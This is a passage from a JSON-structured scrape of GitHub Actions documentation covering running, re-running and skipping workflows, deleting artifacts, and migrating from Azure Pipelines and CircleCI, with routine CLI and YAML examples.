        "text": "To trigger theworkflow_dispatchevent, your workflow must be in the default branch. For more information about configuring theworkflow_dispatchevent, seeEvents that trigger workflows."
      },
      {
        "type": "paragraph",
        "text": "Write access to the repository is required to perform these steps."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Running a workflow"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the name of the workflow you want to run.",
          "Above the list of workflow runs, click theRun workflowbutton.NoteTo see theRun workflowbutton, your workflow file must use theworkflow_dispatchevent trigger. Only workflow files that use theworkflow_dispatchevent trigger will have the option to run the workflow manually using theRun workflowbutton. For more information about configuring theworkflow_dispatchevent, seeEvents that trigger workflows.",
          "Select theBranchdropdown menu and click a branch to run the workflow on.",
          "If the workflow requires input, fill in the fields.",
          "ClickRun workflow."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "To learn more about GitHub CLI, seeAbout GitHub CLI."
      },
      {
        "type": "paragraph",
        "text": "To run a workflow, use theworkflow runsubcommand. Replace theworkflowparameter with either the name, ID, or file name of the workflow you want to run. For example,\"Link Checker\",1234567, or\"link-check-test.yml\". If you don't specify a workflow, GitHub CLI returns an interactive menu for you to choose a workflow."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh workflow run WORKFLOW"
      },
      {
        "type": "paragraph",
        "text": "If your workflow accepts inputs, GitHub CLI will prompt you to enter them. Alternatively, you can use-for-Fto add an input inkey=valueformat. Use-Fto read from a file."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh workflow run greet.yml -f name=mona -f greeting=hello -F data=@myfile.txt"
      },
      {
        "type": "paragraph",
        "text": "You can also pass inputs as JSON by using standard input."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "echo '{\"name\":\"mona\", \"greeting\":\"hello\"}' | gh workflow run greet.yml --json"
      },
      {
        "type": "paragraph",
        "text": "To run a workflow on a branch other than the repository's default branch, use the--refflag."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh workflow run WORKFLOW --ref BRANCH"
      },
      {
        "type": "paragraph",
        "text": "To view the progress of the workflow run, use therun watchsubcommand and select the run from the interactive list."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run watch"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Running a workflow using the REST API"
      },
      {
        "type": "paragraph",
        "text": "When using the REST API, you configure theinputsandrefas request body parameters. If the inputs are omitted, the default values defined in the workflow file are used."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "You can define up to 10inputsfor aworkflow_dispatchevent."
      },
      {
        "type": "paragraph",
        "text": "For more information about using the REST API, seeREST API endpoints for workflows."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About re-running workflows and jobs"
      },
      {
        "type": "paragraph",
        "text": "Re-running a workflow or jobs in a workflow uses the sameGITHUB_SHA(commit SHA) andGITHUB_REF(Git ref) of the original event that triggered the workflow run. The workflow will use the privileges of the actor who initially triggered the workflow, not the privileges of the actor who initiated the re-run. You can re-run a workflow or jobs in a workflow for up to 30 days after the initial run. You cannot re-run jobs in a workflow once its logs have passed their retention limits. For more information, seeUsage limits, billing, and administration. When you re-run a workflow or jobs in a workflow, you can enable debug logging for the re-run. This will enable runner diagnostic logging and step debug logging for the re-run. For more information about debug logging, seeEnabling debug logging"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Re-running all the jobs in a workflow"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to see.",
          "From the list of workflow runs, click the name of the run to see the workflow run summary.",
          "In the upper-right corner of the workflow, re-run jobs.If any jobs failed, select theRe-run jobsdropdown menu and clickRe-run all jobs.If no jobs failed, clickRe-run all jobs.",
          "If any jobs failed, select theRe-run jobsdropdown menu and clickRe-run all jobs.",
          "If no jobs failed, clickRe-run all jobs.",
          "Optionally, to enable runner diagnostic logging and step debug logging for the re-run, selectEnable debug logging.",
          "ClickRe-run jobs."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "To learn more about GitHub CLI, seeAbout GitHub CLI."
      },
      {
        "type": "paragraph",
        "text": "To re-run a failed workflow run, use therun rerunsubcommand. Replacerun-idwith the ID of the failed run that you want to re-run. If you don't specify arun-id, GitHub CLI returns an interactive menu for you to choose a recent failed run."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run rerun RUN_ID"
      },
      {
        "type": "paragraph",
        "text": "To enable runner diagnostic logging and step debug logging for the re-run, use the--debugflag."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run rerun RUN_ID --debug"
      },
      {
        "type": "paragraph",
        "text": "To view the progress of the workflow run, use therun watchsubcommand and select the run from the interactive list."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run watch"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Re-running failed jobs in a workflow"
      },
      {
        "type": "paragraph",
        "text": "If any jobs in a workflow run failed, you can re-run just the jobs that failed. When you re-run failed jobs in a workflow, a new workflow run will start for all failed jobs and their dependents. Any outputs for any successful jobs in the previous workflow run will be used for the re-run. Any artifacts that were created in the initial run will be available in the re-run. Any deployment protection rules that passed in the previous run will automatically pass in the re-run."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to see.",
          "From the list of workflow runs, click the name of the run to see the workflow run summary.",
          "In the upper-right corner of the workflow, select theRe-run jobsdropdown menu, and clickRe-run failed jobs.",
          "Optionally, to enable runner diagnostic logging and step debug logging for the re-run, selectEnable debug logging.",
          "ClickRe-run jobs."
        ]
      },
      {
        "type": "paragraph",
        "text": "To re-run failed jobs in a workflow run, use therun rerunsubcommand with the--failedflag. Replacerun-idwith the ID of the run for which you want to re-run failed jobs. If you don't specify arun-id, GitHub CLI returns an interactive menu for you to choose a recent failed run."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run rerun RUN_ID --failed"
      },
      {
        "type": "paragraph",
        "text": "To enable runner diagnostic logging and step debug logging for the re-run, use the--debugflag."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run rerun RUN_ID --failed --debug"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Re-running a specific job in a workflow"
      },
      {
        "type": "paragraph",
        "text": "When you re-run a specific job in a workflow, a new workflow run will start for the job and any dependents. Any outputs for any other jobs in the previous workflow run will be used for the re-run. Any artifacts that were created in the initial run will be available in the re-run. Any deployment protection rules that passed in the previous run will automatically pass in the re-run."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to see.",
          "From the list of workflow runs, click the name of the run to see the workflow run summary.",
          "Under the \"Jobs\" section of the left sidebar, next to the job that you want to re-run, click.",
          "Optionally, to enable runner diagnostic logging and step debug logging for the re-run, selectEnable debug logging.",
          "ClickRe-run jobs."
        ]
      },
      {
        "type": "paragraph",
        "text": "To re-run a specific job in a workflow run, use therun rerunsubcommand with the--jobflag. Replacejob-idwith the ID of the job that you want to re-run."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run rerun --job JOB_ID"
      },
      {
        "type": "paragraph",
        "text": "To enable runner diagnostic logging and step debug logging for the re-run, use the--debugflag."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run rerun --job JOB_ID --debug"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Re-running workflows and jobs with reusable workflows"
      },
      {
        "type": "paragraph",
        "text": "Reusable workflows from public repositories can be referenced using a SHA, a release tag, or a branch name. For more information, seeReusing workflows."
      },
      {
        "type": "paragraph",
        "text": "When you re-run a workflow that uses a reusable workflow and the reference is not a SHA, there are some behaviors to be aware of:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Re-running all jobs in a workflow will use the reusable workflow from the specified reference. For more information about re-running all jobs in a workflow, seeRe-running workflows and jobs.",
          "Re-running failed jobs or a specific job in a workflow will use the reusable workflow from the same commit SHA of the first attempt. For more information about re-running failed jobs in a workflow, seeRe-running workflows and jobs. For more information about re-running a specific job in a workflow, seeRe-running workflows and jobs."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Reviewing previous workflow runs"
      },
      {
        "type": "paragraph",
        "text": "You can view the results from your previous attempts at running a workflow. You can also view previous workflow runs using the API. For more information, seeREST API endpoints for workflow runs."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to see.",
          "From the list of workflow runs, click the name of the run to see the workflow run summary.",
          "To the right of the run name, select theLatestdropdown menu and click a previous run attempt."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/removing-workflow-artifacts",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Deleting an artifact"
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "Once you delete an artifact, it cannot be restored."
      },
      {
        "type": "paragraph",
        "text": "Write access to the repository is required to perform these steps."
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub stores build logs and artifacts for 90 days, and this retention period can be customized. For more information, seeUsage limits, billing, and administration."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to see.",
          "From the list of workflow runs, click the name of the run to see the workflow run summary.",
          "UnderArtifacts, clicknext to the artifact you want to remove."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Setting the retention period for an artifact"
      },
      {
        "type": "paragraph",
        "text": "Retention periods for artifacts and logs can be configured at the repository, organization, and enterprise level. For more information, seeUsage limits, billing, and administration."
      },
      {
        "type": "paragraph",
        "text": "You can also define a custom retention period for individual artifacts using theactions/upload-artifactaction in a workflow. For more information, seeStoring and sharing data from a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Finding the expiration date of an artifact"
      },
      {
        "type": "paragraph",
        "text": "You can use the API to confirm the date that an artifact is scheduled to be deleted. For more information, see theexpires_atvalue returned by the REST API. For more information, seeREST API endpoints for GitHub Actions artifacts."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Artifacts from deleted workflow runs"
      },
      {
        "type": "paragraph",
        "text": "When a workflow run is deleted all artifacts associated with the run are also deleted from storage. You can delete a workflow run using the GitHub Actions UI, the REST API, or using the GitHub CLI, see:Deleting a workflow run,Delete a workflow run, orgh run delete."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/skipping-workflow-runs",
    "content": [
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If a workflow is skipped due topath filtering,branch filteringor a commit message (see below), then checks associated with that workflow will remain in a \"Pending\" state. A pull request that requires those checks to be successful will be blocked from merging."
      },
      {
        "type": "paragraph",
        "text": "Workflows that would otherwise be triggered usingon: pushoron: pull_requestwon't be triggered if you add any of the following strings to the commit message in a push, or the HEAD commit of a pull request:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "[skip ci]",
          "[ci skip]",
          "[no ci]",
          "[skip actions]",
          "[actions skip]"
        ]
      },
      {
        "type": "paragraph",
        "text": "Alternatively, you can add askip-checkstrailer to your commit message. The trailers section should be included at the end of your commit message and be preceded by two empty lines. If you already have other trailers in your commit message,skip-checksshould be last. You can use either of the following:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "skip-checks:true",
          "skip-checks: true"
        ]
      },
      {
        "type": "paragraph",
        "text": "By default, Git automatically removes consecutive newlines. To leave the commit message exactly as you entered it, use the--cleanup=verbatimoption on your commit. For more information, see--cleanup=<mode>in the Git documentation."
      },
      {
        "type": "paragraph",
        "text": "You won't be able to merge the pull request if your repository is configured to require specific checks to pass first. To allow the pull request to be merged you can push a new commit to the pull request without the skip instruction in the commit message."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Skip instructions only apply to thepushandpull_requestevents. For example, adding[skip ci]to a commit message won't stop a workflow that's triggeredon: pull_request_targetfrom running."
      },
      {
        "type": "paragraph",
        "text": "Skip instructions only apply to the workflow run(s) that would be triggered by the commit that contains the skip instructions. You can also disable a workflow from running. For more information, seeDisabling and enabling a workflow."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-azure-pipelines-to-github-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "Azure Pipelines and GitHub Actions both allow you to create workflows that automatically build, test, publish, release, and deploy code. Azure Pipelines and GitHub Actions share some similarities in workflow configuration:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Workflow configuration files are written in YAML and are stored in the code's repository.",
          "Workflows include one or more jobs.",
          "Jobs include one or more steps or individual commands.",
          "Steps or tasks can be reused and shared with the community."
        ]
      },
      {
        "type": "paragraph",
        "text": "For more information, seeUnderstanding GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Key differences"
      },
      {
        "type": "paragraph",
        "text": "When migrating from Azure Pipelines, consider the following differences:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Azure Pipelines supports a legacyclassic editor, which lets you define your CI configuration in a GUI editor instead of creating the pipeline definition in a YAML file. GitHub Actions uses YAML files to define workflows and does not support a graphical editor.",
          "Azure Pipelines allows you to omit some structure in job definitions. For example, if you only have a single job, you don't need to define the job and only need to define its steps. GitHub Actions requires explicit configuration, and YAML structure cannot be omitted.",
          "Azure Pipelines supportsstagesdefined in the YAML file, which can be used to create deployment workflows. GitHub Actions requires you to separate stages into separate YAML workflow files.",
          "On-premises Azure Pipelines build agents can be selected with capabilities. GitHub Actions self-hosted runners can be selected with labels."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Migrating jobs and steps"
      },
      {
        "type": "paragraph",
        "text": "Jobs and steps in Azure Pipelines are very similar to jobs and steps in GitHub Actions. In both systems, jobs have the following characteristics:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Jobs contain a series of steps that run sequentially.",
          "Jobs run on separate virtual machines or in separate containers.",
          "Jobs run in parallel by default, but can be configured to run sequentially."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Migrating script steps"
      },
      {
        "type": "paragraph",
        "text": "You can run a script or a shell command as a step in a workflow. In Azure Pipelines, script steps can be specified using thescriptkey, or with thebash,powershell, orpwshkeys. Scripts can also be specified as an input to theBash taskor thePowerShell task."
      },
      {
        "type": "paragraph",
        "text": "In GitHub Actions, all scripts are specified using therunkey. To select a particular shell, you can specify theshellkey when providing the script. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Below is an example of the syntax for each system."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Azure Pipelines syntax for script steps"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  - job: scripts\n    pool:\n      vmImage: 'windows-latest'\n    steps:\n      - script: echo \"This step runs in the default shell\"\n      - bash: echo \"This step runs in bash\"\n      - pwsh: Write-Host \"This step runs in PowerShell Core\"\n      - task: PowerShell@2\n        inputs:\n          script: Write-Host \"This step runs in PowerShell\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitHub Actions syntax for script steps"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  scripts:\n    runs-on: windows-latest\n    steps:\n      - run: echo \"This step runs in the default shell\"\n      - run: echo \"This step runs in bash\"\n        shell: bash\n      - run: Write-Host \"This step runs in PowerShell Core\"\n        shell: pwsh\n      - run: Write-Host \"This step runs in PowerShell\"\n        shell: powershell"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Differences in script error handling"
      },
      {
        "type": "paragraph",
        "text": "In Azure Pipelines, scripts can be configured to error if any output is sent tostderr. GitHub Actions does not support this configuration."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions configures shells to \"fail fast\" whenever possible, which stops the script immediately if one of the commands in a script exits with an error code. In contrast, Azure Pipelines requires explicit configuration to exit immediately on an error. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Differences in the default shell on Windows"
      },
      {
        "type": "paragraph",
        "text": "In Azure Pipelines, the default shell for scripts on Windows platforms is the Command shell (cmd.exe). In GitHub Actions, the default shell for scripts on Windows platforms is PowerShell. PowerShell has several differences in built-in commands, variable expansion, and flow control."
      },
      {
        "type": "paragraph",
        "text": "If you're running a simple command, you might be able to run a Command shell script in PowerShell without any changes. But in most cases, you will either need to update your script with PowerShell syntax or instruct GitHub Actions to run the script with the Command shell instead of PowerShell. You can do this by specifyingshellascmd."
      },
      {
        "type": "paragraph",
        "text": "Below is an example of the syntax for each system."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Azure Pipelines syntax using CMD by default"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  - job: run_command\n    pool:\n      vmImage: 'windows-latest'\n    steps:\n      - script: echo \"This step runs in CMD on Windows by default\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitHub Actions syntax for specifying CMD"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  run_command:\n    runs-on: windows-latest\n    steps:\n      - run: echo \"This step runs in PowerShell on Windows by default\"\n      - run: echo \"This step runs in CMD on Windows explicitly\"\n        shell: cmd"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Migrating conditionals and expression syntax"
      },
      {
        "type": "paragraph",
        "text": "Azure Pipelines and GitHub Actions can both run steps conditionally. In Azure Pipelines, conditional expressions are specified using theconditionkey. In GitHub Actions, conditional expressions are specified using theifkey."
      },
      {
        "type": "paragraph",
        "text": "Azure Pipelines uses functions within expressions to execute steps conditionally. In contrast, GitHub Actions uses an infix notation. For example, you must replace theeqfunction in Azure Pipelines with the==operator in GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Below is an example of the syntax for each system."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Azure Pipelines syntax for conditional expressions"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  - job: conditional\n    pool:\n      vmImage: 'ubuntu-latest'\n    steps:\n      - script: echo \"This step runs with str equals 'ABC' and num equals 123\"\n        condition: and(eq(variables.str, 'ABC'), eq(variables.num, 123))"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitHub Actions syntax for conditional expressions"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  conditional:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"This step runs with str equals 'ABC' and num equals 123\"\n        if: ${{ env.str == 'ABC' && env.num == 123 }}"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeEvaluate expressions in workflows and actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Dependencies between jobs"
      },
      {
        "type": "paragraph",
        "text": "Both Azure Pipelines and GitHub Actions allow you to set dependencies for a job. In both systems, jobs run in parallel by default, but job dependencies can be specified explicitly. In Azure Pipelines, this is done with thedependsOnkey. In GitHub Actions, this is done with theneedskey."
      },
      {
        "type": "paragraph",
        "text": "Below is an example of the syntax for each system. The workflows start a first job namedinitial, and when that job completes, two jobs namedfanout1andfanout2will run. Finally, when those jobs complete, the jobfaninwill run."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Azure Pipelines syntax for dependencies between jobs"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  - job: initial\n    pool:\n      vmImage: 'ubuntu-latest'\n    steps:\n      - script: echo \"This job will be run first.\"\n  - job: fanout1\n    pool:\n      vmImage: 'ubuntu-latest'\n    dependsOn: initial\n    steps:\n      - script: echo \"This job will run after the initial job, in parallel with fanout2.\"\n  - job: fanout2\n    pool:\n      vmImage: 'ubuntu-latest'\n    dependsOn: initial\n    steps:\n      - script: echo \"This job will run after the initial job, in parallel with fanout1.\"\n  - job: fanin:\n    pool:\n      vmImage: 'ubuntu-latest'\n    dependsOn: [fanout1, fanout2]\n    steps:\n      - script: echo \"This job will run after fanout1 and fanout2 have finished.\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitHub Actions syntax for dependencies between jobs"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  initial:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"This job will be run first.\"\n  fanout1:\n    runs-on: ubuntu-latest\n    needs: initial\n    steps:\n      - run: echo \"This job will run after the initial job, in parallel with fanout2.\"\n  fanout2:\n    runs-on: ubuntu-latest\n    needs: initial\n    steps:\n      - run: echo \"This job will run after the initial job, in parallel with fanout1.\"\n  fanin:\n    runs-on: ubuntu-latest\n    needs: [fanout1, fanout2]\n    steps:\n      - run: echo \"This job will run after fanout1 and fanout2 have finished.\""
      },
      {
        "type": "paragraph",
        "text": "For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Migrating tasks to actions"
      },
      {
        "type": "paragraph",
        "text": "Azure Pipelines usestasks, which are application components that can be re-used in multiple workflows. GitHub Actions usesactions, which can be used to perform tasks and customize your workflow. In both systems, you can specify the name of the task or action to run, along with any required inputs as key/value pairs."
      },
      {
        "type": "paragraph",
        "text": "Below is an example of the syntax for each system."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Azure Pipelines syntax for tasks"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  - job: run_python\n    pool:\n      vmImage: 'ubuntu-latest'\n    steps:\n      - task: UsePythonVersion@0\n        inputs:\n          versionSpec: '3.7'\n          architecture: 'x64'\n      - script: python script.py"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitHub Actions syntax for actions"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  run_python:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/setup-python@v5\n        with:\n          python-version: '3.7'\n          architecture: 'x64'\n      - run: python script.py"
      },
      {
        "type": "paragraph",
        "text": "You can find actions that you can use in your workflow inGitHub Marketplace, or you can create your own actions. For more information, seeSharing automations."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-circleci-to-github-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "CircleCI and GitHub Actions both allow you to create workflows that automatically build, test, publish, release, and deploy code. CircleCI and GitHub Actions share some similarities in workflow configuration:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Workflow configuration files are written in YAML and stored in the repository.",
          "Workflows include one or more jobs.",
          "Jobs include one or more steps or individual commands.",
          "Steps or tasks can be reused and shared with the community."
        ]
      },
      {
        "type": "paragraph",
        "text": "For more information, seeUnderstanding GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Key differences"
      },
      {
        "type": "paragraph",
        "text": "When migrating from CircleCI, consider the following differences:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "CircleCI’s automatic test parallelism automatically groups tests according to user-specified rules or historical timing information. This functionality is not built into GitHub Actions.",
          "Actions that execute in Docker containers are sensitive to permissions problems since containers have a different mapping of users. You can avoid many of these problems by not using theUSERinstruction in yourDockerfile. For more information about the Docker filesystem on GitHub-hosted runners, seeUsing GitHub-hosted runners."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Migrating workflows and jobs"
      },
      {
        "type": "paragraph",
        "text": "CircleCI definesworkflowsin theconfig.ymlfile, which allows you to configure more than one workflow. GitHub requires one workflow file per workflow, and as a consequence, does not require you to declareworkflows. You'll need to create a new workflow file for each workflow configured inconfig.yml."
      },
      {
        "type": "paragraph",
        "text": "Both CircleCI and GitHub Actions configurejobsin the configuration file using similar syntax. If you configure any dependencies between jobs usingrequiresin your CircleCI workflow, you can use the equivalent GitHub Actionsneedssyntax. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Migrating orbs to actions"
      },
      {
        "type": "paragraph",
        "text": "Both CircleCI and GitHub Actions provide a mechanism to reuse and share tasks in a workflow. CircleCI uses a concept called orbs, written in YAML, to provide tasks that people can reuse in a workflow. GitHub Actions has powerful and flexible reusable components called actions, which you build with either JavaScript files or Docker images. You can create actions by writing custom code that interacts with your repository in any way you'd like, including integrating with GitHub's APIs and any publicly available third-party API. For example, an action can publish npm modules, send SMS alerts when urgent issues are created, or deploy production-ready code. For more information, seeSharing automations."
      },
      {
        "type": "paragraph",
        "text": "CircleCI can reuse pieces of workflows with YAML anchors and aliases. GitHub Actions supports the most common need for reusability using matrices. For more information about matrices, seeRunning variations of jobs in a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using Docker images"
      },
      {
        "type": "paragraph",
        "text": "Both CircleCI and GitHub Actions support running steps inside of a Docker image."
      },
      {
        "type": "paragraph",
        "text": "CircleCI provides a set of pre-built images with common dependencies. These images have theUSERset tocircleci, which causes permissions to conflict with GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "We recommend that you move away from CircleCI's pre-built images when you migrate to GitHub Actions. In many cases, you can use actions to install the additional dependencies you need."
      },
      {
        "type": "paragraph",
        "text": "For more information about the Docker filesystem, seeUsing GitHub-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "For more information about the tools and packages available on GitHub-hosted runner images, seeUsing GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using variables and secrets"
      },
      {
        "type": "paragraph",
        "text": "CircleCI and GitHub Actions support setting variables in the configuration file and creating secrets using the CircleCI or GitHub UI."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeStore information in variablesandUsing secrets in GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Caching"
      },
      {
        "type": "paragraph",
        "text": "CircleCI and GitHub Actions provide a method to manually cache files in the configuration file."
      },
      {
        "type": "paragraph",
        "text": "Below is an example of the syntax for each system."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "CircleCI syntax for caching"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- restore_cache:\n    keys:\n      - v1-npm-deps-{{ checksum \"package-lock.json\" }}\n      - v1-npm-deps-"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitHub Actions syntax for caching"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Cache node modules\n  uses: actions/cache@v4\n  with:\n    path: ~/.npm\n    key: v1-npm-deps-${{ hashFiles('**/package-lock.json') }}\n    restore-keys: v1-npm-deps-"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions does not have an equivalent of CircleCI’s Docker Layer Caching (or DLC)."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Persisting data between jobs"
      },
      {
        "type": "paragraph",
        "text": "Both CircleCI and GitHub Actions provide mechanisms to persist data between jobs."
      },
      {
        "type": "paragraph",
        "text": "Below is an example in CircleCI and GitHub Actions configuration syntax."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "CircleCI syntax for persisting data between jobs"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- persist_to_workspace:\n    root: workspace\n    paths:\n      - math-homework.txt\n\n...\n\n- attach_workspace:\n    at: /tmp/workspace"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "GitHub Actions syntax for persisting data between jobs"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Upload math result for job 1\n  uses: actions/upload-artifact@v4\n  with:\n    name: homework\n    path: math-homework.txt\n\n...\n\n- name: Download math result for job 1\n  uses: actions/download-artifact@v4\n  with:\n    name: homework"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeStoring and sharing data from a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using databases and service containers"
      },
      {
        "type": "paragraph",
        "text": "Both systems enable you to include additional containers for databases, caching, or other dependencies."
      },
      {
        "type": "paragraph",
        "text": "In CircleCI, the first image listed in theconfig.yamlis the primary image used to run commands. GitHub Actions uses explicit sections: usecontainerfor the primary container, and list additional containers inservices."
      },
      {
        "type": "paragraph",
        "text": "Below is an example in CircleCI and GitHub Actions configuration syntax."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "CircleCI syntax for using databases and service containers"
      },
      {
        "type": "code",
        "language": "yaml",
